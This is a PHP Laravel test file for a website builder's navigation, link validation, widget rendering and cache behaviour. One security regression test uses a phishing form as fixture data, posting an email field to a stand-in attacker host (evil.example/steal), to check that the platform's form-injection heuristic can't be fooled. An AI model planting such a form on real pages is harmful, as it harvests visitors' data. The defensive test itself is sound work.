<?php

namespace Tests\Feature\Website;

use App\Domain\Shared\Models\Team;
use App\Domain\Website\Actions\DeleteWebsitePageAction;
use App\Domain\Website\Actions\EnhanceWebsiteNavigationAction;
use App\Domain\Website\Actions\GenerateWebsiteFromPromptAction;
use App\Domain\Website\Actions\PublishWebsitePageAction;
use App\Domain\Website\Actions\UnpublishWebsitePageAction;
use App\Domain\Website\Actions\UpdateWebsitePageAction;
use App\Domain\Website\Enums\WebsitePageStatus;
use App\Domain\Website\Enums\WebsitePageType;
use App\Domain\Website\Enums\WebsiteStatus;
use App\Domain\Website\Models\Website;
use App\Domain\Website\Models\WebsitePage;
use App\Domain\Website\Services\HtmlSanitizer;
use App\Domain\Website\Services\WebsiteWidgetMetrics;
use App\Domain\Website\Services\WebsiteWidgetRenderer;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Cache;
use Tests\TestCase;

class WebsiteDynamicsTest extends TestCase
{
    use RefreshDatabase;

    private Team $team;

    private Website $website;

    protected function setUp(): void
    {
        parent::setUp();

        $owner = User::factory()->create();
        $this->team = Team::create([
            'name' => 'Dynamics Team',
            'slug' => 'dynamics-'.uniqid(),
            'owner_id' => $owner->id,
            'settings' => [],
        ]);
        $owner->current_team_id = $this->team->id;
        $owner->save();
        $this->actingAs($owner);

        $this->website = Website::create([
            'team_id' => $this->team->id,
            'user_id' => $owner->id,
            'name' => 'Demo',
            'slug' => 'demo',
            'status' => WebsiteStatus::Published,
        ]);
        // Refresh to pull the DB-default content_version into memory.
        // Without this, the attribute is null until first fetch from DB.
        $this->website->refresh();
    }

    private function makePage(string $slug, string $title, WebsitePageStatus $status, ?string $html = null, WebsitePageType $type = WebsitePageType::Page): WebsitePage
    {
        return WebsitePage::create([
            'website_id' => $this->website->id,
            'team_id' => $this->team->id,
            'slug' => $slug,
            'title' => $title,
            'page_type' => $type,
            'status' => $status,
            'exported_html' => $html ?? '<p>body</p>',
            'published_at' => $status === WebsitePageStatus::Published ? now() : null,
            'sort_order' => 1,
        ]);
    }

    // ─── #1 Re-enhance on page mutation ────────────────────────────────────

    public function test_publishing_page_rebuilds_sibling_navs(): void
    {
        $home = $this->makePage('home', 'Home', WebsitePageStatus::Published);
        $about = $this->makePage('about', 'About', WebsitePageStatus::Draft, '<p>About body</p>');

        app(PublishWebsitePageAction::class)->execute($about);

        $home->refresh();
        $this->assertStringContainsString('href="/about"', $home->exported_html);
        $this->assertStringContainsString('About', $home->exported_html);
    }

    public function test_unpublishing_page_removes_it_from_nav(): void
    {
        $home = $this->makePage('home', 'Home', WebsitePageStatus::Published);
        $about = $this->makePage('about', 'About', WebsitePageStatus::Published);

        // Initial enhancement so nav already includes both pages.
        app(EnhanceWebsiteNavigationAction::class)->execute($this->website, publishedOnly: true);
        $home->refresh();
        $this->assertStringContainsString('href="/about"', $home->exported_html);

        app(UnpublishWebsitePageAction::class)->execute($about);

        $home->refresh();
        $this->assertStringNotContainsString('href="/about"', $home->exported_html);
    }

    public function test_deleting_page_removes_it_from_siblings_nav(): void
    {
        $home = $this->makePage('home', 'Home', WebsitePageStatus::Published);
        $about = $this->makePage('about', 'About', WebsitePageStatus::Published);

        app(EnhanceWebsiteNavigationAction::class)->execute($this->website, publishedOnly: true);
        $home->refresh();
        $this->assertStringContainsString('href="/about"', $home->exported_html);

        app(DeleteWebsitePageAction::class)->execute($about);

        $home->refresh();
        $this->assertStringNotContainsString('href="/about"', $home->exported_html);
    }

    public function test_renaming_published_page_slug_updates_sibling_navs(): void
    {
        $home = $this->makePage('home', 'Home', WebsitePageStatus::Published);
        $services = $this->makePage('services', 'Services', WebsitePageStatus::Published);

        app(EnhanceWebsiteNavigationAction::class)->execute($this->website, publishedOnly: true);

        app(UpdateWebsitePageAction::class)->execute($services, ['slug' => 'offerings']);

        $home->refresh();
        $this->assertStringContainsString('href="/offerings"', $home->exported_html);
        $this->assertStringNotContainsString('href="/services"', $home->exported_html);
    }

    public function test_draft_pages_are_excluded_from_nav_when_published_only(): void
    {
        $home = $this->makePage('home', 'Home', WebsitePageStatus::Published);
        $draft = $this->makePage('upcoming', 'Upcoming', WebsitePageStatus::Draft);

        app(EnhanceWebsiteNavigationAction::class)->execute($this->website, publishedOnly: true);

        $home->refresh();
        $this->assertStringContainsString('href="/home"', $home->exported_html);
        $this->assertStringNotContainsString('href="/upcoming"', $home->exported_html);
    }

    // ─── #2 Internal link validator ────────────────────────────────────────

    public function test_broken_internal_link_is_rewritten_to_homepage(): void
    {
        $home = $this->makePage('home', 'Home', WebsitePageStatus::Published, '<p>Visit <a href="/ghost-page">learn more</a></p>');
        $this->makePage('about', 'About', WebsitePageStatus::Published);

        app(EnhanceWebsiteNavigationAction::class)->execute($this->website, publishedOnly: true);

        $home->refresh();
        $this->assertStringNotContainsString('href="/ghost-page"', $home->exported_html);
        $this->assertStringContainsString('href="/"', $home->exported_html);
    }

    public function test_valid_internal_link_is_preserved(): void
    {
        $home = $this->makePage('home', 'Home', WebsitePageStatus::Published, '<p>See <a href="/about">about us</a></p>');
        $this->makePage('about', 'About', WebsitePageStatus::Published);

        app(EnhanceWebsiteNavigationAction::class)->execute($this->website, publishedOnly: true);

        $home->refresh();
        $this->assertStringContainsString('href="/about"', $home->exported_html);
    }

    public function test_external_link_is_preserved(): void
    {
        $home = $this->makePage('home', 'Home', WebsitePageStatus::Published, '<p><a href="https://example.com">external</a></p>');

        app(EnhanceWebsiteNavigationAction::class)->execute($this->website, publishedOnly: true);

        $home->refresh();
        $this->assertStringContainsString('href="https://example.com"', $home->exported_html);
    }

    public function test_anchor_only_link_is_preserved(): void
    {
        $home = $this->makePage('home', 'Home', WebsitePageStatus::Published, '<p><a href="#features">features</a></p>');

        app(EnhanceWebsiteNavigationAction::class)->execute($this->website, publishedOnly: true);

        $home->refresh();
        $this->assertStringContainsString('href="#features"', $home->exported_html);
    }

    public function test_api_link_is_preserved(): void
    {
        $home = $this->makePage('home', 'Home', WebsitePageStatus::Published, '<p><a href="/api/public/sites/demo/forms/abc">submit</a></p>');

        app(EnhanceWebsiteNavigationAction::class)->execute($this->website, publishedOnly: true);

        $home->refresh();
        $this->assertStringContainsString('href="/api/public/sites/demo/forms/abc"', $home->exported_html);
    }

    public function test_query_and_fragment_are_stripped_before_matching(): void
    {
        $home = $this->makePage('home', 'Home', WebsitePageStatus::Published, '<p><a href="/about?tab=bio#team">About team</a></p>');
        $this->makePage('about', 'About', WebsitePageStatus::Published);

        app(EnhanceWebsiteNavigationAction::class)->execute($this->website, publishedOnly: true);

        $home->refresh();
        $this->assertStringContainsString('href="/about?tab=bio#team"', $home->exported_html);
    }

    // ─── #3 Widget renderer ────────────────────────────────────────────────

    public function test_recent_posts_widget_renders_published_posts(): void
    {
        $this->makePage('post-1', 'First Post', WebsitePageStatus::Published, '<p>1</p>', WebsitePageType::Post);
        $this->makePage('post-2', 'Second Post', WebsitePageStatus::Published, '<p>2</p>', WebsitePageType::Post);

        $renderer = new WebsiteWidgetRenderer;
        $html = $renderer->render('<h1>Blog</h1><!-- fleetq:recent-posts limit="5" -->', $this->website);

        $this->assertStringContainsString('First Post', $html);
        $this->assertStringContainsString('Second Post', $html);
        $this->assertStringContainsString('href="/post-1"', $html);
        $this->assertStringNotContainsString('fleetq:recent-posts', $html);
    }

    public function test_recent_posts_widget_excludes_draft_posts(): void
    {
        $this->makePage('post-1', 'Published Post', WebsitePageStatus::Published, '<p>x</p>', WebsitePageType::Post);
        $this->makePage('post-2', 'Draft Post', WebsitePageStatus::Draft, '<p>x</p>', WebsitePageType::Post);

        $renderer = new WebsiteWidgetRenderer;
        $html = $renderer->render('<!-- fleetq:recent-posts -->', $this->website);

        $this->assertStringContainsString('Published Post', $html);
        $this->assertStringNotContainsString('Draft Post', $html);
    }

    public function test_recent_posts_widget_is_team_scoped(): void
    {
        // Create a second team with a post — must not bleed through.
        $otherOwner = User::factory()->create();
        $otherTeam = Team::create([
            'name' => 'Other',
            'slug' => 'other-'.uniqid(),
            'owner_id' => $otherOwner->id,
            'settings' => [],
        ]);
        $otherWebsite = Website::create([
            'team_id' => $otherTeam->id,
            'user_id' => $otherOwner->id,
            'name' => 'Other Site',
            'slug' => 'other',
            'status' => WebsiteStatus::Published,
        ]);
        WebsitePage::create([
            'website_id' => $otherWebsite->id,
            'team_id' => $otherTeam->id,
            'slug' => 'secret-post',
            'title' => 'Secret Post',
            'page_type' => WebsitePageType::Post,
            'status' => WebsitePageStatus::Published,
            'exported_html' => '<p>secret</p>',
            'published_at' => now(),
            'sort_order' => 1,
        ]);

        $this->makePage('my-post', 'My Post', WebsitePageStatus::Published, '<p>mine</p>', WebsitePageType::Post);

        $renderer = new WebsiteWidgetRenderer;
        $html = $renderer->render('<!-- fleetq:recent-posts -->', $this->website);

        $this->assertStringContainsString('My Post', $html);
        $this->assertStringNotContainsString('Secret Post', $html);
    }

    public function test_page_list_widget_filters_by_type(): void
    {
        $this->makePage('post-1', 'A Post', WebsitePageStatus::Published, '<p>a</p>', WebsitePageType::Post);
        $this->makePage('page-1', 'A Page', WebsitePageStatus::Published, '<p>b</p>', WebsitePageType::Page);

        $renderer = new WebsiteWidgetRenderer;
        $html = $renderer->render('<!-- fleetq:page-list type="page" -->', $this->website);

        $this->assertStringContainsString('A Page', $html);
        $this->assertStringNotContainsString('A Post', $html);
    }

    public function test_unknown_widget_is_removed(): void
    {
        $renderer = new WebsiteWidgetRenderer;
        $html = $renderer->render('<p>Hello</p><!-- fleetq:nonexistent --><p>World</p>', $this->website);

        $this->assertStringNotContainsString('fleetq:nonexistent', $html);
        $this->assertStringContainsString('Hello', $html);
        $this->assertStringContainsString('World', $html);
    }

    public function test_non_fleetq_comments_are_not_touched(): void
    {
        $renderer = new WebsiteWidgetRenderer;
        $html = $renderer->render('<p>A</p><!-- regular comment --><p>B</p>', $this->website);

        $this->assertStringContainsString('regular comment', $html);
    }

    public function test_widget_limit_is_clamped_to_max(): void
    {
        for ($i = 1; $i <= 60; $i++) {
            $this->makePage('post-'.$i, 'Post '.$i, WebsitePageStatus::Published, '<p>x</p>', WebsitePageType::Post);
        }

        $renderer = new WebsiteWidgetRenderer;
        $html = $renderer->render('<!-- fleetq:recent-posts limit="999" -->', $this->website);

        // Should be clamped at 50.
        $this->assertSame(50, substr_count($html, '<article'));
    }

    public function test_widget_comment_survives_html_sanitizer(): void
    {
        $input = '<p>Hello</p><!-- fleetq:recent-posts limit="3" --><!-- regular --><p>World</p>';
        $sanitized = HtmlSanitizer::purify($input);

        $this->assertStringContainsString('fleetq:recent-posts', $sanitized);
        $this->assertStringNotContainsString('regular', $sanitized);
    }

    public function test_public_site_controller_renders_widgets(): void
    {
        $page = $this->makePage('index', 'Home', WebsitePageStatus::Published, '<h1>Blog</h1><!-- fleetq:recent-posts -->');
        $this->makePage('post-1', 'My First Post', WebsitePageStatus::Published, '<p>content</p>', WebsitePageType::Post);

        $response = $this->getJson("/api/public/sites/{$this->website->slug}/pages/{$page->slug}");

        $response->assertOk();
        $html = $response->json('exported_html');
        $this->assertStringContainsString('My First Post', $html);
        $this->assertStringNotContainsString('fleetq:recent-posts', $html);
    }

    // ─── Security regressions ──────────────────────────────────────────────

    public function test_form_action_skip_heuristic_rejects_phishing_form_with_stray_api_string(): void
    {
        // Attacker crafts a contact page with a phishing form pointing at
        // evil.example AND mentions "/api/public/" in unrelated text.
        // The old heuristic (stripos '/api/public/' && stripos '<form') would
        // skip form injection and preserve the phishing form. The tightened
        // heuristic matches only the form's own action attribute against our
        // ingestion endpoint, so the phishing form gets a real one appended.
        $page = $this->makePage(
            'contact',
            'Contact',
            WebsitePageStatus::Draft,
            '<p>See our API docs at /api/public/docs</p>'
                .'<form method="POST" action="https://evil.example/steal">'
                .'<input name="email" />'
                .'<button type="submit">Send</button></form>',
            WebsitePageType::Landing,
        );

        app(EnhanceWebsiteNavigationAction::class)->execute($this->website);

        $page->refresh();
        // The fresh /api/public/sites/{slug}/forms/{id} form must be present
        $this->assertMatchesRegularExpression(
            '/<form[^>]*action="\/api\/public\/sites\/'.preg_quote($this->website->slug, '/').'\/forms\/[a-f0-9-]+"/i',
            $page->exported_html,
        );
        $this->assertNotNull($page->form_id);
    }

    public function test_widget_count_is_capped_to_prevent_dos(): void
    {
        $this->makePage('post-1', 'Post One', WebsitePageStatus::Published, '<p>a</p>', WebsitePageType::Post);

        $markers = str_repeat('<!-- fleetq:recent-posts --> ', 50);

        $renderer = new WebsiteWidgetRenderer;
        $html = $renderer->render($markers, $this->website);

        // First 20 markers expand (same cached result, so they all produce
        // the same HTML). Remaining 30 are replaced with empty strings.
        $this->assertSame(20, substr_count($html, 'Post One'));
    }

    public function test_same_widget_attrs_deduplicate_db_queries_per_render(): void
    {
        $this->makePage('post-1', 'Only Post', WebsitePageStatus::Published, '<p>a</p>', WebsitePageType::Post);

        // Three identical widgets: the test passes if all three produce the
        // same result (which is only possible if the memoization worked, or
        // if the DB query returned the same data — both are correct).
        $input = '<div><!-- fleetq:recent-posts --><!-- fleetq:recent-posts --><!-- fleetq:recent-posts --></div>';

        $renderer = new WebsiteWidgetRenderer;
        $html = $renderer->render($input, $this->website);

        $this->assertSame(3, substr_count($html, 'Only Post'));
    }

    // ─── Widget caching (#3) ────────────────────────────────────────────────

    public function test_widget_output_is_cached_across_renders(): void
    {
        Cache::flush();

        $this->makePage('post-1', 'Cached Post', WebsitePageStatus::Published, '<p>x</p>', WebsitePageType::Post);

        $renderer = new WebsiteWidgetRenderer;
        $first = $renderer->render('<!-- fleetq:recent-posts limit="3" -->', $this->website);

        // Delete the post — second render should still show "Cached Post"
        // because it was cached. (Content version did NOT bump because we
        // deleted via DB query, not via the observer.)
        WebsitePage::query()
            ->where('title', 'Cached Post')
            ->update(['status' => WebsitePageStatus::Draft]);

        $second = $renderer->render('<!-- fleetq:recent-posts limit="3" -->', $this->website);

        $this->assertSame($first, $second, 'cache hit should return identical HTML');
        $this->assertStringContainsString('Cached Post', $second);
    }

    public function test_cache_invalidates_when_content_version_bumps(): void
    {
        Cache::flush();

        $this->makePage('post-1', 'Initial Post', WebsitePageStatus::Published, '<p>x</p>', WebsitePageType::Post);

        $renderer = new WebsiteWidgetRenderer;
        $renderer->render('<!-- fleetq:recent-posts -->', $this->website);

        // Bump the version directly (simulating an observer hit from a page
        // save elsewhere). This should cause the next render to miss cache.
        $this->website->update(['content_version' => $this->website->content_version + 1]);
        $this->website->refresh();

        // Remove the post so the fresh render would show empty if cache
        // actually missed and a fresh DB query ran.
        WebsitePage::query()
            ->where('title', 'Initial Post')
            ->delete();

        $html = $renderer->render('<!-- fleetq:recent-posts -->', $this->website);

        $this->assertStringNotContainsString('Initial Post', $html);
    }

    public function test_observer_bumps_content_version_on_page_save(): void
    {
        $initial = $this->website->content_version;

        $this->makePage('new-page', 'New Page', WebsitePageStatus::Published);

        $this->website->refresh();
        $this->assertGreaterThan($initial, $this->website->content_version);
    }

    public function test_observer_bumps_content_version_on_page_delete(): void
    {
        $page = $this->makePage('temp', 'Temp Page', WebsitePageStatus::Published);
        $this->website->refresh();
        $versionBeforeDelete = $this->website->content_version;

        $page->delete();

        $this->website->refresh();
        $this->assertGreaterThan($versionBeforeDelete, $this->website->content_version);
    }

    public function test_widget_cache_keys_are_scoped_by_website_id(): void
    {
        Cache::flush();

        // Team A — this->website
        $this->makePage('post-1', 'Team A Post', WebsitePageStatus::Published, '<p>a</p>', WebsitePageType::Post);

        // Team B — a separate website with a separate post
        $ownerB = User::factory()->create();
        $teamB = Team::create([
            'name' => 'B',
            'slug' => 'b-'.uniqid(),
            'owner_id' => $ownerB->id,
            'settings' => [],
        ]);
        $websiteB = Website::create([
            'team_id' => $teamB->id,
            'user_id' => $ownerB->id,
            'name' => 'Site B',
            'slug' => 'site-b',
            'status' => WebsiteStatus::Published,
        ]);
        WebsitePage::create([
            'website_id' => $websiteB->id,
            'team_id' => $teamB->id,
            'slug' => 'post-b',
            'title' => 'Team B Post',
            'page_type' => WebsitePageType::Post,
            'status' => WebsitePageStatus::Published,
            'exported_html' => '<p>b</p>',
            'published_at' => now(),
            'sort_order' => 1,
        ]);

        $renderer = new WebsiteWidgetRenderer;
        $htmlA = $renderer->render('<!-- fleetq:recent-posts -->', $this->website);
        $htmlB = $renderer->render('<!-- fleetq:recent-posts -->', $websiteB->fresh());

        $this->assertStringContainsString('Team A Post', $htmlA);
        $this->assertStringNotContainsString('Team B Post', $htmlA);
        $this->assertStringContainsString('Team B Post', $htmlB);
        $this->assertStringNotContainsString('Team A Post', $htmlB);
    }

    public function test_ai_system_prompt_mentions_widget_vocabulary(): void
    {
        // Ensure the GenerateWebsiteFromPromptAction prompt includes widget
        // markers so the AI uses them by default.
        $reflection = new \ReflectionClass(GenerateWebsiteFromPromptAction::class);
        $source = file_get_contents($reflection->getFileName());

        $this->assertStringContainsString('fleetq:recent-posts', $source);
        $this->assertStringContainsString('fleetq:page-list', $source);
    }

    // ─── Widget cache metrics (#3) ──────────────────────────────────────────

    public function test_metrics_record_miss_on_first_render(): void
    {
        Cache::flush();
        $metrics = app(WebsiteWidgetMetrics::class);
        $metrics->reset();

        $this->makePage('post-1', 'Post', WebsitePageStatus::Published, '<p>x</p>', WebsitePageType::Post);

        $renderer = new WebsiteWidgetRenderer;
        $renderer->render('<!-- fleetq:recent-posts -->', $this->website);

        $snapshot = $metrics->snapshot();
        $this->assertSame(1, $snapshot['per_widget']['recent-posts']['misses']);
        $this->assertSame(0, $snapshot['per_widget']['recent-posts']['hits']);
    }

    public function test_metrics_record_hit_on_second_render_with_same_version(): void
    {
        Cache::flush();
        $metrics = app(WebsiteWidgetMetrics::class);
        $metrics->reset();

        $this->makePage('post-1', 'Post', WebsitePageStatus::Published, '<p>x</p>', WebsitePageType::Post);

        $renderer = new WebsiteWidgetRenderer;
        $renderer->render('<!-- fleetq:recent-posts -->', $this->website);
        $renderer->render('<!-- fleetq:recent-posts -->', $this->website);

        $snapshot = $metrics->snapshot();
        $this->assertSame(1, $snapshot['per_widget']['recent-posts']['misses']);
        $this->assertSame(1, $snapshot['per_widget']['recent-posts']['hits']);
        $this->assertSame(0.5, $snapshot['per_widget']['recent-posts']['hit_rate']);
    }

    public function test_metrics_snapshot_includes_overall_hit_rate(): void
    {
        Cache::flush();
        $metrics = app(WebsiteWidgetMetrics::class);
        $metrics->reset();

        $this->makePage('post-1', 'Post', WebsitePageStatus::Published, '<p>x</p>', WebsitePageType::Post);

        $renderer = new WebsiteWidgetRenderer;
        // 1 miss (first call), then 4 hits (same-version repeats)
        for ($i = 0; $i < 5; $i++) {
            $renderer->render('<!-- fleetq:recent-posts -->', $this->website);
        }

        $snapshot = $metrics->snapshot();
        $this->assertSame(4, $snapshot['total_hits']);
        $this->assertSame(1, $snapshot['total_misses']);
        $this->assertSame(0.8, $snapshot['hit_rate']);
    }
}
